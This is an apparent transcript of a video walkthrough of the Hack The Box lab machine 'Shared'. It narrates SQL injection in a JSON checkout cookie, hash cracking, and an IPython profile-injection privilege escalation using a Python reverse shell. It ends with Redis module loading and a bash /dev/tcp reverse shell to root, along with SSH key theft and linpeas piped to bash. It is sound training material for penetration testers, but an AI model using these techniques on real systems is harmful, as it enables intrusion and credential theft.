 what's going on YouTube this is ipsag I'm doing share it from hack the box which I really enjoyed it had three main steps the first one was finding a SQL injection and an e-commerce platform that happened during the checkout and the unique thing here is the SQL injection happened in a cookie it was within a Json payload so you had to be careful not to break the Json by not using double quotes but once you do all that the SQL injection is relatively straightforward you get some credentials to sshn from the database and then you can escalate to a different user using kind of like a path injection type vulnerability IPython older versions um we'll load the profile from the current working directory so you create a malicious IPython profile and then want to use and ran IPython from that directory uh you'd get code execution on them and then the final exploit of this box was just a simple red S one you had to reverse a go laying binary which you don't really reverse you can just have it connect back to any netcat session get the password and they log into redis and you can use that to execute code so with with all that being said let's jump in as always we start off with an end map so Dash SC for default scripts SV enumerate versions OA output all formats playing the end map directory and call it shared and then the IP address of 1010 11.172 this can take some time to run so I've already ran it looking at the results we have a few ports open the first one being SSH on Port 22 and its Mana tells us it's a Debian box then we have HTTP on Port 80 it's running engine X 1.18 and also https on 443 also running engine X 1.18 and it is leaking a SSL certificate of star.share.hdb so right off the bat we know there is going to be a hostname of shared.htb and if we try to access the page we can see it redirects to this page so what I'm going to do is just copy this and add it into my host real quick so sudo VI etsyhost and then we can do 10 10 11 172 shared.htb and I'm just going to go to https 10 10 11 172. and we want to accept the certificate and then redirects us to share.htb Azure and map said so accept this certificate and we get in so the first thing I want to do is uh take a look at the page so we see a link that says my store and they're talking about downtime here also there's a new checkout process so typically in CTS whenever they say this is a new thing um we should definitely look into it as it says but I always look at the entire picture before I go digging down any rabbit holes we do see it is powered by prestashop and I know that is just a open source project so I'm going to Google Presto shop GitHub and go over to the page to check out a little bit more about this and we can see it is PHP and one of my favorite things to do is try to see if I can figure out the version of the open source app that's running because it helps so much when it comes to finding vulnerabilities so I'm going to try install.text and we can see they have left this behind and we're looking at this string installation instructions for prestashop1.7 and if I look at the install.text we can see it says prestashop8 so right off the bat we know we have are a different version here so we can go over to the history and try to figure out which commit or installed on text is at um I'm gonna try like going to this remove pressed uh Trust and the removing these strings find modules and themes so I'm just going to check that exists here so this commit has not happened yet so we can go back look at it I'm looking at maybe improve install doc let's see I'm looking for a good link that has this so I guess to install it's looking for https so let's see what this link says it's https so we know this GitHub uh commit has happened I think that was improve install doc so let's see use correct protocol and install.txt what is this this is talking about crowd.in using https this is this so we know this change has made it uh this remove this one did not right because find module in themes wasn't it yeah so this is the commit we're at which is March 8th 2021 or so we're somewhere between these two commits so whenever we look for a cve we want to go somewhere between that so if I just search Presta Let's see we have a block wish list module and this a time-based and these could be potential right so this is a cve 2022 since it says module I'm going to guess this is an add-on this is a cve 2020 or version from 2021 so I'm going to ignore that um and then this one 1.770 this doesn't have a cve tied to it but it seems if this takes five seconds then it's going to be vulnerable let's just paste this see how long this takes that did not take five seconds so I'm gonna guess this one is an older cve as well and I say five seconds because I'm looking at the Sleep five right there and then this block wish list let's see PS underscore for tables yeah this is a plug-in for it so I'm going to guess this isn't vulnerable potentially so we'll just save that one if we ever come across a plug-in instead of keeping going down different holes so let's go back and just take a look at the new checkout process so what I'm going to do is try to buy something so I'm going to get this shirt add it to my current proceed to checkout and then proceed to checkout and we get an error because it's taking us to checkout.shared.hdb so let's add this to a host so checkout.shared.htb refresh the page we get a certificate error accept it and it's got product quantity oh they used a comma instead of a period it threw me off I was like this shirt is twenty three thousand dollars but now um it's asking for some credit card data and a payment so let's do one two three four one two three four one two three four one two three four and then one two three I'm going to intercept this just so we can see what the request looks like when we pay and this doesn't even make a request so I don't think we're supposed to do anything there because nothing's making a request um I don't know exactly how the product got translated into this so let me take burp Suite off real quick so we can quickly go back a few pages so when we added this to the cart it put a product in that I would assume says hummingbird t-shirt in a cart but it's saying like 5G something so I don't know where that is I'm guessing this may be like the item ID so if we press F12 go into storage we can look at our cookies and there is a custom cart cookie and if I edit this cookie let's see actually before we edit let's put this in brip Suite so it's easier to see so intercept is on burp sweet refresh the page we can see this custom cart if I highlight the text prep Suite automatically decodes it and we can see it's decoded to 53 gg2 ef8 which is what is displayed so I'm going to see can I edit just straight in this oh I can let's change this to please subscribe so I'm putting Please Subscribe in the cookie and then we're gonna win going to send it and I should have done that on this page so please subscribe click apply changes for this request and the product is not found so it is doing some type of database lookup on that product which makes sense because if we did the legitimate product um let's see it pulls the quantity and the price there's nothing about quantity and price in a cookie the cookie only has the item name so it looks like there may be some type of SQL injection in here so I'm just going to put a single quote and then we can say actually let's revert our cookie so if we go to repeater Ctrl Z to revert I'm going to put a single quote here apply send it and what we want to look for is let's see if I do this and always search here I wonder if it'll be easily find not found auto scroll send yep so this gets us here so we're just looking at that where we have the item name and then a single quote I'm going to do dash dash plus Dash which is a plus I think comes into a space let's do percent 20. there we go so plus I isn't getting URL decoded but percent 20 is also a space so if I do dash dash space we see it now works so this is definitely going to be SQL injectable now we could try um Union we probably will have to URL encode this select one two three oh we don't have to URL and code it so we don't even need the percent 20. that could just be a straight space um but we definitely have Union injection here if I change this item to be something that doesn't exist so it starts at 53 so this is going to be the item I'm just going to put does not exist and now we can see a union let us expel some data so where the two is we can do at version and we see it put the SQL version here so now we have complete SQL injection on this application we could be incredibly lazy and just copy this request to a file and then use it for um what is it SQL map so if we wanted to do that we just copy it this is called shared and this will be check out dot request I guess if I do LS we have it here the one thing we'll want to do to help SQL map is go into the cookie and we don't have to do this we could like specify level five risk three I believe and it would just automatically work but take a long time if you ever know where a SQL injection is you can tell SQL map it's where the star is so if I put a star here it should automatically pick this up and try SQL injection there and um this is just the uh squiggly bracket then a quote then a star a quote of the squiggly bracket or comma right there but so SQL map checkout we can specify Dash R for checkout request we want to force SSL because this is a https site and I can say technique is equal to U for Union and then dash dash batch I think that's enough to tell it where it is and you can see it found the custom injection marker and it did not inject let's see what this looks like let's cat checkout.request when I copy this go to burp Suites decoder paste it that looks fine let's see risk five level three I put those backwards risk three level five and I'll just let that go we'll go and um do it manually while that runs so Let's see we have the version here so what we want to do is a sub query so I'm going to put it in quotes right away and we can do select group concat and the reason why I'm doing group concat is [Music] um because I want to put multiple rows on one line and I think this is schemata I think that's gonna be the table name or database name from information information schema Dot schemata let's see information schema maybe schema name is that the table yep that's it so I would just be going to like the uh my sequel um help page or documentation to pull all this stuff out if I struggle if you don't understand this definitely check out ipsec rocks there is a machine called Union that I did that explains this whole Union injection thing I'm doing much better than I'm doing now but we can see there is a database name checkout so my next step is table name then a single uh colon and we'll do column name from information schema dot columns where schemata is I'll just do like checkout zero is matched no products incurred oh my Cookie's bad um we have double quotes here this is and some Json see schema name okay I don't have that memorized so let's do my sequel information schema table see no matter how many times you do this always end up forgetting something so let's see table reference columns table underscore schema or yeah where table schema there we go uh documentation always helps so we have a list of tables here and SQL map did not find it maybe in the after we pop this box we'll take a look at it so V tables let's replace that uh we want to replace comma with return there we go so we want to get the username and password out of the user table so what we can do go back here change this to be username this to be password and we can change this to just be from user and we have a user here James Mason and then a hash so let's grab this V users put this and that looks like an md5 some just because it looks like 32 characters but to be safe check it out it is so let's go to uh crackstation I guess and if this doesn't come up with a result then I would switch over to hashcat and try to crack it but sometimes this is faster depending whether or not I can pass this test which I can and we have a password of Soleil 101 so let's copy this and I'm going to try sh James underscore Mason at 10 10 11 172. and then I'm also going to try James after this but looks like that worked so that was the password um we can look at other users on this box so let's grab for anything that ends in sh and we have root James Mason and Dan Smith which doesn't really help us at all I mean we know an extra user on the box um the only extra tidbit of information I'm seeing here that I think most people may miss out on is we have this field this is the user ID info field it's just a comment for the user where you can put just generic information so we just have the first name and then a bunch of commas I'm guessing that's because this is uid 1000 which means James Mason was the user that the installer had created so the very first thing I check with that is like what groups I'm a member of to see if I'm in like the lxc group or other things I am a member of developers so we should check that out in a minute but um we don't see Dan Smith with that I'm guessing it was created with like the user ad command so um yeah I guess other fields here we see commas but you generally have like first name last name phone number address things like that so uh nothing to interesting we can do a fine slash Dash group developer and then pipe errors to devnoll to see what is here and we can also add a dash LS so we see permissions there is this opt script review folder if I OS it we don't see anything interesting there is a time stamp of July 14th on this script review so I'm gonna check the file system for files modified between July 13th and 15th so let's do find slash and then newer empty for newer modified time and do July 13th and then do a not so it's saying the time is greater than the 13th and not greater than the 15th and then again pipe errors to Dev null and oh um we need newer Mt here uh we didn't get an error message because we hid them right so we want newer MD like that that's getting data so let's hide all errors and we have a lot of files so let's take a look at them um I'm going to also add the dash LS thing so we can see earners and things um interesting enough we do have the dance myth we can go in his home directory and get some things so that is interesting looking at other things uh nothing interesting in D package we do have a bunch of files in the www directory so we probably should get some credentials out of this so let's go is there anything in HTML an index.php that's interesting uh it's just telling it to move to the shared.hdb so let's go into this there is a PS folder which probably is Presto shop and then let's go to config grep Dash I Dash R pass for password and what I want to do is find the password I'm going to do less dash s just because I hate line wrapping um let's see I'm guessing if pastors are good for 360 days minimum length of eight I don't see the password but we do have this variable database underscore password um I'm going to go up a directory and we're going to grep for that so grip for database password um let's hide error messages and that's much more manageable so install an upgrade.php we can ignore we have um why didn't we see this book oh um there's two config directories apparently there's config and then app config and inside app config we do have this password so I'm going to uh grab this actually let's take a look at the file to get the username so let's copy this we less it and we can see where is database password right here and the user is prestashop or p-shop so let us save this the credits.txt P sharp this MySQL shared okay and then there was a another web server and check out I'm guessing these credentials are the same because they went to the same database but doesn't hurt to check right uh looks like a different password so we have this user as checkout so let's do checkout put this password and this will be my SQL check out and when we did this SQL injection we were the checkout user so what I'm going to do is um do a MySQL Dash u p Sharp Dash p for password and I'm going to log in with this just to look at the databases available because maybe there's an extra database and it doesn't look like there is um the theory there was when we did the SQL injection we did it on the checkout page we saw the databases available to checkout I want to make sure there's no database available to prestashop that wasn't available to check out um nothing there so we can go into the home directory there is Dan Smith there was a DOT SSH but only Dan Smith can access it so let's try and Su as Dan Smith and we can try the two credentials that we have so let's copy this paste it in looks like that's going to fail we can try the other credential as well so s u Dash um Dan Smith paste in the password and it looks like that fails as well so there is this IPython directory so I'm going to go into it there is a profile default and first let's just see if we can write to anything in this directory whenever you can write to a Python's but not python a program's profile uh you may be able to get to execute code and the only thing that is writable is Bash history so nothing really there um and Bash history is pointed to devnoll so can't even view that file so let's go into a python profile default there is a history.sqlite so let's do a strings history.sqlite and looking at it it looks like IPython is running every single minute because we just see this increment oddly enough it didn't run between 09 like we're missing 10 and 11 here but it's still running um is there anything in log nothing in log so we can check the IPython version and we see it is version eight so let's see is there any IPython 8.00 rce if there's any way to get code execution a GitHub advisory and it's saying uh IPython will execute a profile that's in the current working directory so we don't know where I python is running we know it's opening every single minute but we don't know its directory is it staying open if I grab for IPython we don't see it so we have to run like piece by or something to show me processes every minute um what I'm going to do instead is we'll do it with limpies um and the reason why I'm doing this is because we've shown piece by a hundred times let's do it a little bit more interesting if I go to Lin piece I always like downloading the latest so let's save it to my disk and then we can make dub dub dub and go in here and move Lin peas downloads limpies.sh to my directory and by default it's not going to run the check so we can see by here um this fast check we can see fast do not check one minute of processes and do an Su Brute Force so I'm going to remove that so we remove the default and now Lin piece will check for processes so let's do Python 3 Dash M ACP server and we can execute it so curl 10 10 14 8.8 000 limpies.sh pipe it over to bash uh curl not found let's try is it wget Dash Q Dash capital O for standard um write file to standard out uh Len Pisa sh not found because I have limpy's sh dot sh there we go now Lin peas is running so this is going to take a while I'm probably going to pause the video and we'll just look at it when it's done because we know it's going to take at least one minute because it's got the fast mode disabled and the whole reason I disabled it in the file itself instead of just passing it as a parameter because when I'm executing uh lint piece this way with like w get a curl without touching disc it's hard to pass parameters in so I find it's just easiest to modify the script itself so um yeah I'm going to pause the video because we see it's now uh doing a bunch of checks that may take a while one interesting thing I just noticed while Lynn piece was running we have this one check um it's looking for passwords inside of key folders and it did not find the um password for us which is odd um so you can't always depend on these automated tools to find passwords because we know there are two passwords in these key folders it's definitely going in www because we have the prestashop folder right here and it didn't find the config.php password and checkout which is interesting because that was relatively easy and didn't find the one in the app config and I'm um not surprised I didn't find that one because it was a bit hidden so maybe one day I'll look at exactly how it determines what a password is what a password actually is because that logic can definitely be improved upon since it's not finding them but I'm going to pause the video again and we'll just wait for this to finish because lint piece is still running and there we go Lynn peas has finally finished the one thing we really cared about was IPython so I'm just going to search the terminal for that we can see it found SQL light files and it tried to extract information nothing was in it so um nothing got extracted we do have files inside of Home directories finding the history.sqlite that we found manually uh modified in the last five minutes of course the sqlite history file was and here we go different processes executed during the one minute so we have um cron starting and then it's running a sleep I'm guessing KRON starts sleep maybe then we have root C dot sh executing and then I python gets executed and the first thing it does is p kill against IPython go into see the opscripts review and execute IPython so now we know the current working directory that IPython is ran out of so if I just go in here and we created a profile default directory iupython presumably would start executing things out of that I'm going to go into Dev shm to do my work because I'm assuming there's a cleanup script that's cleaning this script review directory so I'm just going to create it in here and then we will copy it over so if a cleanup script happens we don't lose any of our data so the first thing we want to do is a make well we do two makers oh I'm just going to do one and instead of doing both of them I'm going to do Dash p for create the parent as well um it's doing an attempt let's just do it in my current directory so if I do lsla we see profile default and then we see a startup directory and what I want to do is create any python file here so I'm going to create shell.pi and I'm going to Google python reverse shell and then let's go to payload all the things and we'll just copy and paste the python payload from here so go to python here's a payload we can copy this paste it in uh we can make it pretty by saying all semicolons are now returns and then we can say the IP is going to be 10 10 14. 8 which is my IP and then the port is 9001. okay so let's go up to directories we can do NC lvnp 9001 and what I want to do is copy actually before I do this I'm just going to run IPython here because if I did it correct I should get a shell right there we go uh so let's quit let's do this again ncp-r profile default and opt script review look at the time and in about 20 seconds hopefully we get a reverse shell from Dan Smith so another 10 to 15 seconds and then the first thing I'm going to do with that shell is grab his key so there is the Shell let's go CD home Dan Smith go to SSH and then cat ID RSA so we have his private key so grab this hit enter to copy and then V Dan dot key paste it in and we could do like the normal PTY trick to upgrade our shell but whenever you have SSH use SSH just because it's much more reliable so chmod sh Dash I Dan dot key Dan Smith at 10 10 11 172. and we get logged in as Dan so looking at his directory um let's look at his groups he is a member of sis admin so I'm going to do fine slash Dash group sis admin to devnoll to see what this user can use and there is this redis connector Dev so if I execute this we get output so it did something logging into redis using password and then it just outputs the info command I guess so what we want to do is try to get this password from this redis connector so if we do file against it we can see it is going to be a go laying binary we could try strings in it and less and I don't think there's going to be any like easy to read strings in golang we just see bunches and bunches of these four or five characters things so let's see man strings strings Dash H there's a minimum right strings I don't know where to do minimum string let's just change the encoding strings s on this we have some of the packages it uses but there's just so much information here I don't think we're going to get anywhere just doing strings so the quickest way I can think of it is running it against our local box so let's um SCP this file so I'm going to do scp-i-dan dot key then Dan Smith at 10 10 11 172. and let's copy this so paste and then r underscore Dev to our current directory so now that it's copied we can just execute it right so chmod plus X redis Dev and we can't connect because um nothing's listening on localhost 6379 which is the redis port um I wonder what happens if we did just listen on that will it just output the password to us I doubt it it can't be that easy right so if I just execute it um we get off and then this is this going to be the password let's do redis uh CLI auth username password um usernames in bracket so I wonder if that means it may not be required let's just do this okay um auth invalid so honestly that gets us logged in so now that we're logged into the database let's go over to hat tricks and see if there's anything fun we can do with redis so there's this pen testing redis page and let's see basic information automated we have Authentication [Music] uh we can dump the database if we do info key space info key space um let's do auth again info key space it's blank so nothing there uh redis rce I think this is going to be like an old version or something um redis less than 505 I'm going to ignore this for now may go back to it other things are overwriting files um red SEI config what is this so this is writing a SSH key this is writing a cron tab we can try those in a second um this is loading a redis module I've never done this let's try this real quick so what do we want to do system exec is the release there isn't build redis is this going to be a simple make if it's a simple make I'll do it if it's going to be more complex probably won't because I'm guessing I may have to install a bunch of dependencies um we have module DSL so I think that was it CP module.so up One Directory so now we can scp-i Dan dot key Dan Smith at 10 10 11 172. oh we need to specify the file modular SL okay I'm going to authenticate again and then we want to do where's module load and then path so module load home Dan Smith module.sl and it says okay so we should now be able to do system exec and we can so system exec ID so now let's do bash Dash C bash Dash I then was it like this Dev TCP 10 10 14 8 9001 zero and one like that and see lvnp 9001 run it unknown command system exec let's see is this still a command system dot exact ID weird uh let's authenticate again so I wonder if redis is like restarting something every minute or so so we do that where's the module load command doesn't look out of control R to do that do this nclvnp 9001 and there we go we have a shell as root so now I can do lsla or we can go to slash root and get root dot text so um I guess we should have put a SSH key because something's killing it every minute or so but yeah that's how you do the box so hope you guys enjoyed that actually sorry for the sloppy cut I wanted to show you one thing or maybe not show you I wanted to figure out one thing why my SQL map didn't work because we have this checkout.request and if I look at it it looks fine like we're telling escrow map to inject here and this is going to be the I'm just going to do it in less because I always have bad luck when I copy and paste out of them um but if I do this let me go to cyber chef let's load this up to do a URL decode we can see it looks as we expect like this is where it's putting the SQL injection but for some reason it didn't work so what I'm going to do is a dash V to put this in Reverse mode and this should show me the queries it makes um maybe not 1V let's do two v's we're going to do V's until it shows us the information we want right um I'm still not seeing Union injections so maybe it's three V's and here we go we got payloads so this is all the payloads it's doing to test for SQL injection and I don't see anything I would tell me this is Union injectable um I guess it's not putting a comment after this and that oh no there is a comment huh I wonder why that's not working because this should definitely work right now um what is 7b22 what is that uh okay that is this I wonder if it's cutting off the payload or it's just not displaying the rest of the payload let's see what if I edit checkout request because we saw like if we just sent like this put ASD where the start is it would get not found so I wonder if I prefix this with a valid cookie or a valid thing so I want to go to uh checkout.share.htb what is it or I can probably go to repeater tab hold Ctrl Z so we get to the original payload well let's copy this go to cyber chef going to copy this because now maybe SQL map oh God not that um I'm hoping SQL map will get some like it's Boolean detection will be better if we prefix this with something valid not that there we go finally pasted okay now we run this again and still didn't find it let's see just for my own sanity I want to paste this to make sure it is what I expect it to look like that is exactly what I expected so we can get rid of that change it wasn't that so it started with five three um man SQL map Union is there a union column Union not found is it a capital let's see I'm going to tell it Union I think it's col for columns I'm gonna tell it there's three columns does this work it's doing a lot more injectable exploit with null value so yeah I think it works so specifying the number of columns worked which is odd because here we see it's doing generic Union three to three columns if we go before let's see this should be it it says one to ten columns so oddly enough it never checked I guess one to ten is my guess um because we look at this it's definitely saying it is injectable so now we could do like dash dash dump and dump information right so that's how to do it through SQL map it's now attempting to crack the password which I don't think it will do or maybe it did but now we have all the information out of the database so um hope you guys enjoyed that video take care and I will see you all next time